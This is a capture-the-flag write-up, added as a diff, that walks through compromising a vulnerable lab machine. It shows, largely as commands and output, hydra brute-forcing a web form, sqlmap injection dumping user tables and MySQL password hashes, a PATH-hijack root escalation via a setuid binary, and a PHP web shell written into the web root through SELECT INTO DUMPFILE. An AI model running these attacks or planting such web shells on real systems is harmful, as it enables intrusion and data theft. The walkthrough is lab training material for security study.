@@ -1,0 +1,157 @@
+1- nmap scan shows port 777 is ssh port
+2- tried dirbuster found phpmyadmin ---> dead end
+3- tried to extract metadata from main image by exiftool
+------------------------------------------------------------
+ExifTool Version Number         : 9.74
+File Name                       : main.gif
+Directory                       : .
+File Size                       : 16 kB
+File Modification Date/Time     : 2016:01:15 02:57:42-05:00
+File Access Date/Time           : 2016:01:15 02:57:48-05:00
+File Inode Change Date/Time     : 2016:01:15 02:57:43-05:00
+File Permissions                : rw-r--r--
+File Type                       : GIF
+MIME Type                       : image/gif
+GIF Version                     : 89a
+Image Width                     : 235
+Image Height                    : 302
+Has Color Map                   : No
+Color Resolution Depth          : 8
+Bits Per Pixel                  : 1
+Background Color                : 0
+Comment                         : P-): kzMb5nVYJw
+Image Size                      : 235x302
+-------------------------------------------------------------
+4- tried too access 192.168.0.101/kzMb5nVYJw
+password form , i tried to scan sql injection nothing
+5- brute force the form by hydra
+# hydra 192.168.0.101 http-form-post "/kzMb5nVYJw/index.php:key=^PASS^:invalid key" -l ignore -P /usr/share/wordlists/rockyou.txt
+the output :
+[80][http-post-form] host: 192.168.0.101   login: ignore   password: elite
+then tried elite password gives another form "Search for usernames:"
+6- intercept Get request by burp-suite
+7- test the get request by sqlmap to id sql injection
+# sqlmap -r results.txt --dbs
+available databases [5]:
+[*] information_schema
+[*] mysql
+[*] performance_schema
+[*] phpmyadmin
+[*] seth
+------------------------------
+8-
+# sqlmap -r results.txt -D seth --dump
+Database: seth
+Table: users
+[2 entries]
++----+---------------------------------------------+--------+------------+
+| id | pass                                        | user   | position   |
++----+---------------------------------------------+--------+------------+
+| 1  | YzZkNmJkN2ViZjgwNmY0M2M3NmFjYzM2ODE3MDNiODE | ramses | <blank>    |
+| 2  | --not allowed--                             | isis   | employee   |
++----+---------------------------------------------+--------+------------+
+9- google YzZkNmJkN2ViZjgwNmY0M2M3NmFjYzM2ODE3MDNiODE the result is "omega"
+10- #ssh ramses@192.168.0.101 -p 777    ------- password : omega
+
+11 --------------------privilege escalation-------------------------------
+# cat .bash_history
+sudo -s
+su eric
+exit
+ls
+clear
+cd /var/www
+cd backup/
+ls
+./procwatch
+clear
+sudo -s
+cd /
+ls
+exit
+
+12- # cd /var/www/backup
+# ./procwatch
+procwatch is program to run ps command in root permission
+ps command located in /bin/ps and you can confirm by # which ps
+13 - then i add /tmp to PATH
+# export PATH=/tmp:/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games
+14 - then copied /bin/sh to /tmp and changed name to ps
+# cp /bin/sh /tmp/ps
+then
+15- # ./procwatch
+# whoami
+root !
+
+16---------------- capture the flage ----------------------------
+
+cd /root
+cat proof.txt
+
+------------------------------------------------------------------
+adf11c7a9e6523e630aaf3b9b7acb51d
+
+It seems that you have pwned the box, congrats.
+Now you done that I wanna talk with you. Write a walk & mail at
+xly0n@sigaint.org attach the walk and proof.txt
+If sigaint.org is down you may mail at nbsly0n@gmail.com
+
+
+USE THIS PGP PUBLIC KEY
+
+-----BEGIN PGP PUBLIC KEY BLOCK-----
+Version: BCPG C# v1.6.1.0
+
+mQENBFW9BX8BCACVNFJtV4KeFa/TgJZgNefJQ+fD1+LNEGnv5rw3uSV+jWigpxrJ
+Q3tO375S1KRrYxhHjEh0HKwTBCIopIcRFFRy1Qg9uW7cxYnTlDTp9QERuQ7hQOFT
+e4QU3gZPd/VibPhzbJC/pdbDpuxqU8iKxqQr0VmTX6wIGwN8GlrnKr1/xhSRTprq
+Cu7OyNC8+HKu/NpJ7j8mxDTLrvoD+hD21usssThXgZJ5a31iMWj4i0WUEKFN22KK
++z9pmlOJ5Xfhc2xx+WHtST53Ewk8D+Hjn+mh4s9/pjppdpMFUhr1poXPsI2HTWNe
+YcvzcQHwzXj6hvtcXlJj+yzM2iEuRdIJ1r41ABEBAAG0EW5ic2x5MG5AZ21haWwu
+Y29tiQEcBBABAgAGBQJVvQV/AAoJENDZ4VE7RHERJVkH/RUeh6qn116Lf5mAScNS
+HhWTUulxIllPmnOPxB9/yk0j6fvWE9dDtcS9eFgKCthUQts7OFPhc3ilbYA2Fz7q
+m7iAe97aW8pz3AeD6f6MX53Un70B3Z8yJFQbdusbQa1+MI2CCJL44Q/J5654vIGn
+XQk6Oc7xWEgxLH+IjNQgh6V+MTce8fOp2SEVPcMZZuz2+XI9nrCV1dfAcwJJyF58
+kjxYRRryD57olIyb9GsQgZkvPjHCg5JMdzQqOBoJZFPw/nNCEwQexWrgW7bqL/N8
+TM2C0X57+ok7eqj8gUEuX/6FxBtYPpqUIaRT9kdeJPYHsiLJlZcXM0HZrPVvt1HU
+Gms=
+=PiAQ
+-----END PGP PUBLIC KEY BLOCK-----
+-------------------------------------------------------------------
+DONE !!
+
+
+------------ NOTE ---------------------------------------------------
+from mysql database
+sqlmap -u http://192.168.0.101/kzMb5nVYJw/420search.php?usrtosearch= -D mysql -T user --dump
+
+localhost,root,<blank>,*18DC78FB0C441444482C7D1132C7A23D705DAFA7 (sunnyvale),<blank>,Y,Y,Y,Y,Y,<blank>,Y,Y,Y,0,Y,Y,Y,<blank>,Y,Y,Y,Y,<blank>,Y,Y,Y,0,Y,0,Y,Y,Y,Y,Y,Y,Y,Y,0,<blank>,Y,Y
+nullbyte,root,<blank>,*18DC78FB0C441444482C7D1132C7A23D705DAFA7 (sunnyvale),<blank>,Y,Y,Y,Y,Y,<blank>,Y,Y,Y,0,Y,Y,Y,<blank>,Y,Y,Y,Y,<blank>,Y,Y,Y,0,Y,0,Y,Y,Y,Y,Y,Y,Y,Y,0,<blank>,Y,Y
+127.0.0.1,root,<blank>,*18DC78FB0C441444482C7D1132C7A23D705DAFA7 (sunnyvale),<blank>,Y,Y,Y,Y,Y,<blank>,Y,Y,Y,0,Y,Y,Y,<blank>,Y,Y,Y,Y,<blank>,Y,Y,Y,0,Y,0,Y,Y,Y,Y,Y,Y,Y,Y,0,<blank>,Y,Y
+::1,root,<blank>,*18DC78FB0C441444482C7D1132C7A23D705DAFA7 (sunnyvale),<blank>,Y,Y,Y,Y,Y,<blank>,Y,Y,Y,0,Y,Y,Y,<blank>,Y,Y,Y,Y,<blank>,Y,Y,Y,0,Y,0,Y,Y,Y,Y,Y,Y,Y,Y,0,<blank>,Y,Y
+localhost,debian-sys-maint,<blank>,*BD9EDF51931EC5408154EBBB88AA01DA22B8A8DC,<blank>,Y,Y,Y,Y,Y,<blank>,Y,Y,Y,0,Y,Y,Y,<blank>,Y,Y,Y,Y,<blank>,Y,Y,Y,0,Y,0,Y,Y,Y,Y,Y,Y,Y,Y,0,NULL,Y,Y
+localhost,phpmyadmin,<blank>,*18DC78FB0C441444482C7D1132C7A23D705DAFA7 (sunnyvale),<blank>,N,N,N,N,N,<blank>,N,N,N,0,N,N,N,<blank>,N,N,N,N,<blank>,N,N,N,0,N,0,N,N,N,N,N,N,N,N,0,NULL,N,N
+
+
+So ,, the password to phpmyadmin is sunnyvale
+Then access phpmyadmin
+then
+
+CREATE TABLE backdoor(
+Stack TEXT
+) ENGINE=MYSIaM;
+
+INSERT INTO backdoor
+VALUES(
+'<?php echo "<pre>"; system($_GET["cmd"]); echo "</pre>"; ?>'
+);
+
+SELECT *
+INTO DUMPFILE '/var/www/html/uploads/shell.php'
+FROM backdoor;
+
+
+Then via browser
+http://192.168.0.101/uploads/shell?cmd=id
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+Then you can upload a web shell but no need !!
